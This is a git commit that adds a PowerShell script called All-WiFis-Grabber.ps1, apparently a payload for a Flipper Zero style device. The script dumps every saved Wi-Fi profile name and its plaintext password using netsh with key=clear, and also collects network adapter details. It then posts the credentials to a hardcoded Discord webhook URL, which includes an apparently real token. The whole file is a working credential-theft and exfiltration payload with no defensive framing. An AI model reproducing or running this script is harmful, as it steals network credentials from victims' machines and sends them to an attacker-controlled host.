e27d879b6a19fab8f0a7d31f46c4907024fd35fa
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-05-30 18:53:20 +0100

    📜 Created All-WiFis-Grabber.ps1 [v1.0]

---
+++ assets/All-WiFis-Grabber.ps1
@@ -0,0 +1,48 @@
+# Created by Will | @willsflipper
+
+# :::       ::: ::::::::::: :::        :::        
+# :+:       :+:     :+:     :+:        :+:        
+# +:+       +:+     +:+     +:+        +:+        
+# +#+  +:+  +#+     +#+     +#+        +#+        
+# +#+ +#+#+ +#+     +#+     +#+        +#+        
+#  #+#+# #+#+#      #+#     #+#        #+#        
+#   ###   ###   ########### ########## ##########
+
+$webhookUrl = "https://discord.com/api/webhooks/1069011168993230930/cGeC4LkDJNsvyA6bUJ4leZUsdBkjjjm2eouS3CIgf7DMwh_MMjG3mWZKMpYP3-suKR4u"
+if (([string]::IsNullOrEmpty("$webhookUrl"))) {exit}
+
+$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+$WLANProfileNames = @()
+$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+
+foreach ($WLANProfileName in $Output) {
+    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+}
+$output = @()
+$discordProfiles = ""
+
+foreach ($WLANProfileName in $WLANProfileNames) {
+    try {
+        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+    } catch {
+        $WLANProfilePassword = "The password is not stored in this profile"
+    }
+    if ($webhookUrl.Contains('discord.com/api/webhooks/')) {
+        $discordProfiles += "ssid: $WLANProfileName\npass: $WLANProfilePassword\n"
+        $output = @"
+{"content": null,"embeds": [{"title": "WiFis:","description": "$discordProfiles","color": 16753920,"author": {"name": "WiFis Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}
+"@
+    } else {
+        $object = $output | ConvertFrom-Json
+
+        if ($object -eq $null) {
+            $object = @{
+                "SSID" = "Password"
+            }
+        }
+
+        Add-Member -InputObject $object -NotePropertyName $WLANProfileName -NotePropertyValue $WLANProfilePassword
+        $output = $object | ConvertTo-Json
+    }
+}
+Invoke-WebRequest -ContentType 'Application/Json' -Uri "$webhookUrl" -Method Post -Body ($output)
